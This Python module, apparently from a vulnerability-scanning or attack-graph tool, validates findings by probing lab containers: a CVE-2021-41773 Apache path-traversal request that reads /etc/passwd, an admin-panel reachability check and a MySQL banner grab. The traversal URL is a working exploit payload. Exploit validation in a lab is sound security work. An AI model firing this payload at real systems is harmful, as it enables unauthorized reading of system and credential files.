"""Live exploit validation against the local lab.

Fires *non-destructive* read-only probes against lab container targets that
match a known rule+CVE pattern, then stamps the corresponding GraphEdge rows
with a `verified_at` timestamp and a truncated response snippet as evidence.

A verified edge in the demo is a different conversation than a theoretical
edge: it proves the rule fired on behavior, not just on fingerprints.
"""
from __future__ import annotations

import asyncio
import logging
from datetime import datetime

import httpx
from sqlalchemy.orm import Session

from backend.db.models import Asset, GraphEdge, Scan

log = logging.getLogger(__name__)

PROBE_TIMEOUT = 3.0
MAX_SNIPPET = 320


async def _probe_apache_path_traversal(host: str) -> dict | None:
    """CVE-2021-41773 safe read probe. Fails closed if container isn't reachable."""
    url = f"http://{host}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    try:
        async with httpx.AsyncClient(timeout=PROBE_TIMEOUT, follow_redirects=False) as client:
            response = await client.get(url)
    except (httpx.HTTPError, OSError) as exc:
        return {"probe": "apache_path_traversal", "target": url, "error": str(exc)}
    body = response.text or ""
    ok = response.status_code == 200 and "root:" in body
    snippet = body[:MAX_SNIPPET]
    return {
        "probe": "apache_path_traversal",
        "cve": "CVE-2021-41773",
        "target": url,
        "status_code": response.status_code,
        "verified": ok,
        "snippet": snippet,
    }


async def _probe_admin_panel(host: str, path: str) -> dict | None:
    url = f"http://{host}{path}"
    try:
        async with httpx.AsyncClient(timeout=PROBE_TIMEOUT, follow_redirects=False) as client:
            response = await client.get(url)
    except (httpx.HTTPError, OSError) as exc:
        return {"probe": "admin_panel_reachable", "target": url, "error": str(exc)}
    body_preview = (response.text or "")[:MAX_SNIPPET]
    ok = response.status_code < 400
    return {
        "probe": "admin_panel_reachable",
        "target": url,
        "status_code": response.status_code,
        "verified": ok,
        "snippet": body_preview,
    }


async def _probe_mysql_banner(host: str, port: int = 3306) -> dict | None:
    """Read MySQL handshake greeting. Does not authenticate or modify state."""
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=PROBE_TIMEOUT)
    except (OSError, asyncio.TimeoutError) as exc:
        return {"probe": "mysql_banner", "target": f"{host}:{port}", "error": str(exc)}
    try:
        banner = await asyncio.wait_for(reader.read(128), timeout=PROBE_TIMEOUT)
    except asyncio.TimeoutError:
        banner = b""
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:  # noqa: BLE001
            pass
    printable = banner.decode("latin-1", errors="replace")
    return {
        "probe": "mysql_banner",
        "target": f"{host}:{port}",
        "status_code": 0,
        "verified": bool(banner),
        "snippet": printable[:MAX_SNIPPET],
    }


def _edge_targets(scan: Scan) -> list[tuple[GraphEdge, Asset]]:
    assets_by_id = {asset.id: asset for asset in scan.assets}
    pairs: list[tuple[GraphEdge, Asset]] = []
    for edge in scan.edges:
        asset = assets_by_id.get(edge.target_id)
        if asset is None or not asset.ip_address:
            continue
        pairs.append((edge, asset))
    return pairs


async def _probe_for_edge(edge: GraphEdge, asset: Asset) -> dict | None:
    cve_ids = {cve.cve_id for cve in asset.cves}
    if edge.rule_id == "EXP-001" and "CVE-2021-41773" in cve_ids:
        return await _probe_apache_path_traversal(asset.ip_address)
    if edge.rule_id == "MISC-001" and asset.admin_panels:
        panel = next((p for p in asset.admin_panels if not p.get("auth")), asset.admin_panels[0])
        return await _probe_admin_panel(asset.ip_address, panel.get("path") or "/")
    if edge.rule_id == "DATA-001" and asset.is_crown_jewel and asset.asset_type == "db":
        port = next((p.port_number for p in asset.ports if (p.service_name or "").lower().startswith("mysql")), 3306)
        return await _probe_mysql_banner(asset.ip_address, port)
    return None


async def validate_scan(db: Session, scan: Scan) -> list[dict]:
    results: list[dict] = []
    for edge, asset in _edge_targets(scan):
        probe_result = await _probe_for_edge(edge, asset)
        if probe_result is None:
            continue
        verified = bool(probe_result.get("verified"))
        if verified:
            edge.verified_at = datetime.utcnow()
            edge.verification_evidence = probe_result
        results.append({
            "edge_id": edge.id,
            "source_id": edge.source_id,
            "target_id": edge.target_id,
            "rule_id": edge.rule_id,
            "verified": verified,
            "probe": probe_result.get("probe"),
            "status_code": probe_result.get("status_code"),
            "snippet": probe_result.get("snippet"),
            "error": probe_result.get("error"),
        })
    db.commit()
    return results
